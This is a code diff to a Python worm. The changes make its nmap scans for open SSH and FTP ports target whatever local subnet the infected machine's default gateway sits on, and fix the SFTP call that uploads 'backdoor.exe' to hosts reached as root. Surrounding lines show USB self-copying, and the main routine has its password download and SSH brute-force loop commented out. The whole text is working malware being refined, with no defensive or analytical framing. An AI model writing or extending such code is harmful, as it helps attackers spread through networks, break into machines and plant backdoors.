@@ -17,11 +17,16 @@ import ftplib
 from shutil import copy2
 import win32api
 
+import netifaces
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
 coloredlogs.install(level='DEBUG', logger=logger)
 # --------------------------------------------------- #
 
+
+# gets gateway of the network
+gws = netifaces.gateways()
+gateway = gws['default'][netifaces.AF_INET][0]
 
 def get_private_ip():
     """
@@ -35,6 +40,8 @@ def get_private_ip():
     ip = socket.gethostbyname(socket.gethostname())
     logger.debug("IP: " + ip)
     return ip
+
+
 def get_public_ip():
     """
     Gets public IP address of this network.
@@ -59,8 +66,12 @@ def scan_ssh_hosts():
     """
     logger.debug("Scanning machines on the same network with port 22 open.")
 
+
+    logger.debug("Gateway: " + gateway)
+
     port_scanner = nmap.PortScanner()
-    port_scanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+    port_scanner.scan(gateway + "/24", arguments='-p 22 --open')
+
     all_hosts = port_scanner.all_hosts()
 
     logger.debug("Hosts: " + str(all_hosts))
@@ -78,7 +89,7 @@ def scan_ftp_hosts():
     logger.debug("Scanning machines on the same network with port 21 open.")
 
     port_scanner = nmap.PortScanner()
-    port_scanner.scan('192.168.1.0/24', arguments='-p 21 --open')
+    port_scanner.scan(gateway + '/24', arguments='-p 21 --open')
     all_hosts = port_scanner.all_hosts()
 
     logger.debug("Hosts: " + str(all_hosts))
@@ -134,7 +145,7 @@ def connect_to_ssh(host, password):
         client.connect(host, 22, "root", password)
         logger.debug("Successfully connected!")
 
-        sftp = s.open_sftp()
+        sftp = client.open_sftp()
         sftp.put('backdoor.exe', "destination") # change this.
 
         return True
@@ -182,10 +193,12 @@ def usbspreading():
                 copy2(__file__, drive)
         time.sleep(3)
 
+
 def main():
-    download_ssh_passwords("passwords.txt")
-    for host in scan_ssh_hosts():
-        bruteforce_ssh(host, "passwords.txt")
+    #download_ssh_passwords("passwords.txt")
+    #for host in scan_ssh_hosts():
+        #bruteforce_ssh(host, "passwords.txt")
+    scan_ssh_hosts()
 
 
 if __name__ == "__main__":
